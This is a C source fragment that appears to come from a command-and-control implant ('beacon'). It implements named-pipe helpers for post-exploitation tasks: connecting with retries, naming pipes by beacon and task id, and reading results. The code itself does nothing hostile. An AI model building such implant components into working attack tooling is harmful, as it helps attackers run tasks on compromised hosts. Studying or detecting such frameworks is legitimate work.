#include "postex_internal.h"
#include "beacon_crypto.h"

/* 连接 PostEx 子进程创建的命名管道，允许短时间等待管道出现。 */
BOOL PostExConnectPipe(const CHAR* pipe_name, HANDLE* pipe)
{
    DWORD mode = PIPE_READMODE_BYTE;
    DWORD err;
    INT i;

    if (!pipe) return FALSE;
    *pipe = INVALID_HANDLE_VALUE;
    if (!pipe_name || !pipe_name[0]) return FALSE;

    for (i = 0; i < 20; ++i) {
        *pipe = CreateFileA(pipe_name, GENERIC_READ | GENERIC_WRITE, 0, NULL,
                            OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
        if (*pipe != INVALID_HANDLE_VALUE) {
            if (SetNamedPipeHandleState(*pipe, &mode, NULL, NULL)) {
                return TRUE;
            }
            CloseHandle(*pipe);
            *pipe = INVALID_HANDLE_VALUE;
            return FALSE;
        }
        err = GetLastError();
        if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
            Sleep(500);
            continue;
        }
        if (err != ERROR_PIPE_BUSY) {
            return FALSE;
        }
        if (!WaitNamedPipeA(pipe_name, 500)) {
            return FALSE;
        }
    }
    return FALSE;
}

/* 基于 beacon id、task id 和随机后缀构建唯一 pipe 名。 */
BOOL PostExBuildPipeName(struct BeaconContext* ctx, UINT32 task_id,
                         CHAR* out, SIZE_T out_size)
{
    UINT32 suffix;

    if (!ctx || !out || out_size == 0) return FALSE;
    suffix = CryptoRandomU32();
    return _snprintf_s(out, out_size, _TRUNCATE,
                       "\\\\.\\pipe\\beacon_postex_%08lx_%08lx_%08lx",
                       (ULONG)ctx->beacon_id,
                       (ULONG)task_id,
                       (ULONG)suffix) > 0;
}

/* 等待 pipe 上出现数据，最多等待 wait_ms。 */
VOID PostExWaitData(HANDLE pipe, DWORD wait_ms)
{
    DWORD start;

    if (!pipe || pipe == INVALID_HANDLE_VALUE || wait_ms == 0) return;
    if (wait_ms > POSTEX_MAX_WAIT_MS) wait_ms = POSTEX_MAX_WAIT_MS;

    start = GetTickCount();
    while (GetTickCount() - start < wait_ms) {
        DWORD avail = 0;
        if (!PeekNamedPipe(pipe, NULL, 0, NULL, &avail, NULL) || avail > 0) {
            return;
        }
        Sleep(100);
    }
}

/* 从 pipe 中精确读取 len 字节。 */
BOOL PostExReadExact(HANDLE pipe, VOID* data, DWORD len)
{
    BYTE8* p = (BYTE8*)data;
    DWORD done = 0;

    while (done < len) {
        DWORD got = 0;
        if (!ReadFile(pipe, p + done, len - done, &got, NULL) || got == 0) {
            return FALSE;
        }
        done += got;
    }
    return TRUE;
}
